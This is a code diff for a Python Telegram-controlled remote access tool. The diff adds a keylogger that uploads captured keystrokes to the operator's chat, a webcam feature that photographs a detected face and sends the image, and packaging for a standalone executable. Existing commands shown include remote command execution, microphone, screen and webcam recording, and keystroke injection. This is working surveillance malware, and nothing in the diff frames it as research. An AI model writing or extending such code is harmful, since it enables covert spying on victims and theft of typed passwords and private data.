@@ -8,13 +8,12 @@ from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup
 #IMAGES
 import numpy as np
 from PIL import Image
-from io import BytesIO
 from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                  setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                  destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
-                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT)
+                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT, dnn)
 
-#AUDIO/VIDEO
+#MERGE AUDIO&VIDEO
 from moviepy.editor import AudioFileClip, VideoFileClip
 
 #AUDIO
@@ -27,34 +26,54 @@ except ImportError:
     SND_FILENAME = None
 
 #MISC
+import sys
 import json
 import ctypes
+import socket
 import traceback
 import pyautogui as pg
 import subprocess as sp
 from random import choice
-from loguru import logger
 from re import findall, M
+from string import printable
 from time import time, sleep
 from threading import Thread
 from datetime import datetime
 from typing import Any, Callable
-from keyboard import press, release
-from os.path import join, abspath, isdir
+from io import BytesIO, StringIO
+from os.path import join, abspath, isfile
 from webbrowser import open as browseropen
 from platform import system as platform_system
 from os import system, remove, getenv, getcwd, listdir, name 
+from keyboard import press as press_key, release as release_key, read_event, KEY_DOWN
 
 logging = False
 iswindows = name == "nt"
 islinux = not iswindows
 cwd_folder = getcwd()
-vfx = abspath(join(cwd_folder, "vfx"))
-sfx = abspath(join(cwd_folder, "sfx"))
 HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
-if not logging:
-    logger.remove()
-logger.info(f"{iswindows=} {islinux=} {HOME_PATH=} {cwd_folder=}")
+if getattr(sys, 'frozen', False):
+    vfx = abspath(join(sys._MEIPASS, "vfx"))
+    sfx = abspath(join(sys._MEIPASS, "sfx"))
+    prototxt_filename = join(sys._MEIPASS, 'model', '1.prototxt')
+    caffemodel_filename = join(sys._MEIPASS, 'model', '2.caffemodel')
+else:
+    vfx = abspath(join(cwd_folder, "vfx"))
+    sfx = abspath(join(cwd_folder, "sfx"))
+    prototxt_filename = join(cwd_folder, 'model', '1.prototxt')
+    caffemodel_filename = join(cwd_folder, 'model', '2.caffemodel')
+if isfile(prototxt_filename) and isfile(caffemodel_filename):
+    with open(prototxt_filename, 'rb') as f:
+        prototxt_data = f.read()
+    with open(caffemodel_filename, 'rb') as f:
+        caffemodel_data = f.read()
+    prototxt_buffer = np.frombuffer(prototxt_data, dtype=np.uint8)
+    caffemodel_buffer = np.frombuffer(caffemodel_data, dtype=np.uint8)
+    FACERECOGNITION = True
+    net = dnn.readNetFromCaffe(prototxt_buffer.tobytes(), caffemodel_buffer.tobytes())
+else:
+    FACERECOGNITION = False
+
 
 DUCKYHELP = """DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
 REM [comment] – Adds a comment (e.g., REM This is a comment).
@@ -100,6 +119,8 @@ execute - Run system command.
 microphone - Record mic audio.  
 browser - Open URL in browser.
 quickmenu - Opens a quick menu.
+waitforface - Send a webcam photo when face is detected till timeout.
+keylogger - Records pressed keys on keyboard.
 
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
@@ -112,6 +133,14 @@ jumpscare while recording screen and webcam"""
 
 def now() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+def checkconn() -> bool:
+    try:
+        s = socket.socket()
+        s.connect(("www.google.com",80))
+        return True
+    except Exception as e:
+        return False
 
 #AUDIO CONVERSION
 def wav_to_ogg(filename: str, rmold: bool=False) -> str:
@@ -138,7 +167,7 @@ def getCred(filename: str="creds.json") -> tuple[str,int]:
     chat_id = var["chat_id"]
     return token,chat_id
         
-#Resizing assets so they all take the same time to load when doing jumpscares
+#Resizing assets so they all take the same time to load when doing jumpscares(I guess)
 def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
     img = Image.fromarray(image_array)
     img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
@@ -156,7 +185,26 @@ def show_image_fullscreen(image) -> None:
     waitKey(1250)
     destroyAllWindows()
 
-def set_volume(volume_percent: int):
+
+def detect_face(cap:VideoCapture|None=None) -> tuple[int,Mat]:
+    if not FACERECOGNITION:
+        return False, None
+    rls=True
+    if cap:
+        rls=False
+    else:
+        cap = VideoCapture(0)
+    ret, frame = cap.read()
+    if not ret:
+        return 0, None
+    if rls:
+        cap.release()
+    blob = dnn.blobFromImage(frame, 1.0, (300, 300), (104.0, 177.0, 123.0), False, False)
+    net.setInput(blob)
+    detections = net.forward()
+    return sum(1 for i in range(detections.shape[2]) if detections[0, 0, i, 2] > 0.5), frame
+
+def set_volume(volume_percent: int) -> None:
     volume_percent = max(0, min(100, volume_percent))
     system = platform_system()
 
@@ -167,8 +215,6 @@ def set_volume(volume_percent: int):
         sp.run(["amixer", "-D", "pulse", "sset", "Master", f"{volume_percent}%"], check=False)
     elif system == "Darwin":  # macOS
         sp.run(["osascript", "-e", f"set volume output volume {volume_percent}"], check=False)
-    else:
-        print("Unsupported OS")
 
 def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
     return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }
@@ -192,7 +238,7 @@ oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooo
 o888bood8P'   8""88888P'   `Y8bood8P'  o888o  o888o o888o o888o            o888o     
 
 """
-def toducky(payload):
+def toducky(payload) -> str:
     duckyScript = [x.strip() for x in payload.split("\n")]
     final = ""
     defaultDelay = 0
@@ -297,8 +343,7 @@ class EditableMessage:
             self.sent = True
             return self.message_id
         except Exception as e:
-            logger.info(e)
-            #idk
+            ...
     
     def edit(self, new_content: str) -> bool:
         if self.bold:
@@ -426,11 +471,14 @@ class PeppinoTelegram:
             "quickmenu":self.quickmenu,
             "gabinetti":self.gabinetti,
             "jumpscare":self.jumpscare,
+            "keylogger":self.keylogger,
             "screenshot":self.screenshot,
             "messagebox":self.message_box,
+            "waitforface":self.waitforface,
             "webcamclip":self.record_webcam,
             "screenclip":self.record_screen,
             "messagespam":self.spam_windows,
+            "checkforface":self.checkforface,
             "fakeshutdown":self.fake_shutdown,
             "microphone":self.send_record_audio,
             "help":lambda: self.bsend(self.help),
@@ -439,16 +487,15 @@ class PeppinoTelegram:
             "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
         }
     
-    def __send_image(self, image_name: str) -> bool:
+    def __send_image(self, image_name: str, caption=None) -> bool:
         try:
             with open(image_name, "rb") as image:
-                msg = self.bot.sendPhoto(self.owner_id, image)["message_id"]
+                msg = self.bot.sendPhoto(self.owner_id, image, caption=caption)["message_id"]
             return msg
         except Exception as e:
             return self.bsend(f"Error while sending an image\n{e}")
     
     def __playsound(self, audio: str) -> None:
-        logger.info(f"Playing {audio}")
         PlaySound(audio, SND_FILENAME)
     
     def __play_loaded_sound(self, audio: str) -> None:
@@ -463,12 +510,15 @@ class PeppinoTelegram:
     def new_menu(self, menu: dict[str:Any], autosend: bool=True, label="Choose an option: ", page=0, next_btn: bool=False) -> ButtonsMenu:
         return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn)
     
-    def bsend(self, text: str) -> int|None:
+    def bsend(self, text: str, retries=0) -> int|None:
+        if retries>3:
+            return
         try:
-            return self.bot.sendMessage(self.owner_id, text)["message_id"]
+            if checkconn():
+                return self.bot.sendMessage(self.owner_id, text)["message_id"]
+            raise ConnectionError
         except Exception as e:
-            logger.info(f"Error while sending message(?)\n{e}")
-            ...#idk
+            return self.bsend(text, retries+1)
 
     """
   .oooooo.      ooo        ooooo oooooooooooo ooooo      ooo ooooo     ooo
@@ -481,6 +531,7 @@ class PeppinoTelegram:
     """
     def quickmenu(self):
         buttons = {
+            "Selphie":"selphie",
             "Screenshot":"screenshot",
             "Jumpscare":"jumpscare",
             "Plankton":"plankton",
@@ -525,7 +576,7 @@ class PeppinoTelegram:
             waitKey(0)
             remove(image_path)
         except Exception as e:
-            print(e)
+            self.bsend(f"Error while trying to show image: \n{e}")
         
 
     """
@@ -537,6 +588,45 @@ ooooooooo.   oooooooooooo   .oooooo.     .oooooo.   ooooooooo.   oooooooooo.
  888  `88b.   888       o `88b    ooo  `88b    d88'  888  `88b.   888     d88' 
 o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   
     """
+
+    def keylogger(self, timeout=10) -> None:
+        buffer = StringIO()
+        start=time()
+        while time()-start<timeout:
+            event = read_event()
+            if event.event_type == KEY_DOWN:
+                e = event.name.split()[0]
+                if e in printable:
+                    buffer.write(e)
+                else:
+                    buffer.write(f"\n{e.upper()}\n")
+        buffer.seek(0)
+        with buffer:
+            self.bot.sendDocument(self.owner_id, (f"keylog{now()}.txt",buffer))
+
+
+    def checkforface(self) -> None:
+        res, frame = detect_face()
+        if res:
+            self.bsend("Face found")
+        else:
+            self.bsend("Face not found")
+    
+    def waitforface(self, timeout=60):
+        start = time()
+        cap = VideoCapture(0)
+        while time()-start < timeout:
+            res, frame = detect_face(cap)
+            if frame is None:
+                self.bsend("Face recognition model not loaded properly.")
+                break
+            if res:
+                filename = randompngname()
+                imwrite(filename, frame)
+                self.__send_image(filename)
+                cap.release()
+                remove(filename)
+                break
     
     def record_screen(self, duration: int=5, caption: str|None=None) -> None:
         duration = int(duration)
@@ -693,14 +783,11 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
         message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
         filename = randomname()+".wav"
         filepath = join(HOME_PATH, filename)
-        logger.info("Recording audio...")
         res = self.record_audio(filepath, seconds)
         if isinstance(res, Exception):
             err = f"Error while recording audio: {res}"
             self.bsend(err)
-            logger.info(err)
         else:
-            logger.info("Done recording audio...")
             message.edit("Done recording, sending...")
             filepath = wav_to_ogg(filepath, rmold=True)
             with open(filepath, "rb") as fi:
@@ -732,10 +819,10 @@ o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'
             self.bsend(f"Something has happened while getting webcam\n {e}")
 
     def altf4(self) -> None:
-        press('alt')
-        press('f4')
-        release('f4')
-        release('alt')
+        press_key('alt')
+        press_key('f4')
+        release_key('f4')
+        release_key('alt')
     
     def shutdown(self, seconds=0) -> None:
         system(f"shutdown -s -t {seconds}")
@@ -808,7 +895,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         filename = randompngname()
         filepath = join(HOME_PATH, filename)
         self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
-        logger.info("Image downloaded")
         Thread(target=self.show_image, args=[filepath,]).start()
         sleep(0.5)
         remove(filepath)
@@ -866,7 +952,6 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         content_type, chat_type, chat_id = glance(msg)
         sender_name = msg["from"]["first_name"] 
         if chat_id == self.owner_id:
-            logger.info(f"{content_type=} {chat_type=}")
             self.owner_name = sender_name
             if content_type == "text":
                self.parse_text(msg) 
@@ -895,9 +980,10 @@ o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8b
         self.update_commands()
         self.images = load_images()
         self.audios = load_audios()
-        self.selphie(f"Bot started: "+now())
+        #self.selphie(f"Bot started: "+now())
         loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
         loop.run_as_thread()
+        self.bsend("Ready to receive commands")
         while 1:
             try:
                 sleep(0.01)
